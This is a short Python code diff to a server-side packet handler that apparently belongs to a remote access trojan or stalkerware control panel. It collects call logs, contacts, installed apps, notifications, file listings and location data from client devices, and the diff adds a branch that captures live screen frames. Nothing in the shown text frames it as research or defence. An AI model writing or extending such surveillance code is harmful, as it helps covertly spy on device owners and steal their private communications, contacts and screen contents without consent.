@@ -90,6 +90,7 @@ def handle_tcp_data(raw_line, cid):
             elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
             elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
             elif t == 'APP_LIST': cd['apps'] = packet.get('apps', [])
+            elif t == 'SCREEN_FRAME': cd['screen'] = packet.get('frame')
             elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
             elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
             elif t == 'LOCATION_SUCCESS': 
